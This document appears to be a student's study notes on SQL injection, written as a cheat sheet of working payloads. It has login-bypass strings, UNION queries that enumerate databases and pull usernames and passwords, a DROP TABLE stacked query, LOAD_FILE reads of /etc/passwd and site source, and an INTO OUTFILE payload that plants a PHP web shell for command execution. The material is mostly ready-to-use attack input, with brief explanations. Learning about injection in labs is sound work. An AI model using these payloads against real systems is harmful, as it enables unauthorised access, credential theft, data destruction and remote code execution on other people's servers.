[Complete List of Authentication Bypasses](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass)
### SQLI URL Encoding 
|Payload|URL Encoded|
|---|---|
|`'`|`%27`|
|`"`|`%22`|
|`#`|`%23`|
|`;`|`%3B`|
|`)`|`%29`|
### How SQLI works in Web Applications 
Connecting to database 
```php
$conn = new mysqli("localhost", "root", "password", "users");
$query = "select * from logins";
$result = $conn->query($query);
```
Print all results
```php
while($row = $result->fetch_assoc() ){
	echo $row["name"]."<br>";
}
```
Using User Input 
```php
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```
#### Example SQLI
```sql
select * from logins where username like '%$searchInput'
```
Search Term: 
```php
'%1'; DROP TABLE users;'
```
Query:
```sql
select * from logins where username like '%1'; DROP TABLE users;'
```
#### Types: 
![[Pasted image 20230830161241.png]]
###### Union Based
Specify the exact location. i.e: column.
###### Error Bassed 
Get the PHP or SQL errors in the front end.
###### Boolean Based 
Use SQL conditional statements to control whether the page returns the output.
######  Time Based
SQL conditional statements that delay the page response if its true. 
###### Out of Band
May not have direct access to the output, so may need to direct to a remote location, 
# SQL Injection Fundermentals
## Subverting Query Logic 
#### Authentication Bypass
Example Login statement:
```sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
```
If results returned then it is correct. 
##### OR Injection
Need the query to return true
```sql
admin' or '1'='1
```
Final Query: 
```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```
![[Pasted image 20230830162225.png]]

###### If you do not no the username
```sql
Username field = notadmin' or '1=1'
```
```sql
password field = pass' or '1=1'
```
## Using Comments 
### Description 
Comments used to document queries 
(Need an empty space after `--`)
```sql
SELECT username FROM logins; -- Selects usernames from the logins table 
```
Can also use  `#`
```Mysql
SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'
```
Often need to encode the `#` as `%23`
#### Auth Bypass with comment s
```sql
SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
``` 
May need to add parenthesis if they are used. 
`admin')--`
Will allow this:
```sql
SELECT * FROM logins where (username='admin')
```
### Union Clause 
Can be used to combine results 
```MySQL
SELECT * FROM ports UNION SELECT * FROM ships;
```
Only works with equal number of columns. 
##### Example Injection 
```sql
SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '
```

#### Uneven amount of columns 
```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```
Need to Specify the number of columns you want to see. 
```sql
UNION SELECT username, 2, 3, 4 from passwords-- '
```
### Union Injection 
**Find out the number of Columns**
#### Using ORDER BY 
Keep going up numbers until you get an error 
```sql
' order by 1-- 
```
```sql
' order by 2-- 
```
etc....
#### Using UNION 
Injection number of union columns until you get a match
```sql
cn' UNION select 1,2,3-- -
```
**Injection Online**
```sql
cn' UNION select 1,@@version,3,4-- -
```

# Exploitation 
### Database Enumeration 
**Check if you are dealing with MySQL**

|Payload|When to Use|Expected Output|Wrong Output|
|---|---|---|---|
|`SELECT @@version`|When we have full query output|MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'|In MSSQL it returns MSSQL version. Error with other DBMS.|
|`SELECT POW(1,1)`|When we only have numeric output|`1`|Error with other DBMS|
|`SELECT SLEEP(5)`|Blind/No Output|Delays page response for 5 seconds and returns `0`.|Will not delay response with other DBMS|

#### [Information_SCHEMA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html) Databases
Contains metadata about the databases and tables present on the server. 

Information needed to do a union injection 
- List of databases
- List of tables within each database
- List of columns within each table
##### SCHEMATA 
```MySQL
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```
Contains Information as to what databases are available on DBMS.
**UNION SQL Injection Payload**
```sql
cn' UNION select 1,schema_name,3,4,5 from INFORMATION_SCHEMA.SCHEMATA-- 
```
**Find Current Database**
```sql
cn' UNION select 1,database(),2,3-- 
```
##### Tables
```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4,5 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- 
```
List tables in database named `dev`
##### Columns 
Find the column names 
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA, 5 from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- 
```
List columns in table named `credentials`
##### Data 
```sql
cn' UNION select 1, username, password, 4,5 from backup.admin_bk-- 
```
### Reading Files
Must have the `FILE` privilige
#### Get User
```sql
cn' UNION SELECT 1, user(), 3, 4-- 
```
or
```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- 
```
#### Get User Privs
```sql
SELECT super_priv FROM mysql.user
```

```sql
cn' UNION SELECT 1, super_priv, 3, 4, 5 FROM mysql.user-- 
```

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- 
```
Looking for a `Y` to indicate super user privs.
**List Privileges:**
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4, 5 FROM information_schema.user_privileges WHERE user="root"-- 
```
#### Load File 
```sql
SELECT LOAD_FILE('/etc/passwd');
```
Payload:
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4, 5-- 
```
or 
```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4, 5-- 
```
May need to view source code of website

### Loading Files 
**Requirements**
1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server
#### Check variable is allowed
```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

Payload: 
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
Looking for `secure_file_priv` value to be empty, means that can read/write to any location
#### Select INTO Out file
```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```
##### Files through SQLI
To find the web root, use `load_file` to load
`/etc/apache/apache.conf`
`/etc/nginx/nginx.conf`
`%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`,
```sql
cn' union select 1,'file written successfully!',3,4, 5 into outfile '/etc/nginx/nginx.conf'-- 
```
###### Web Shell
```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/shell.php'-- 
```
Visit /shell.php execute commands with the 0 Paramter.
`/shell.php?0=id`
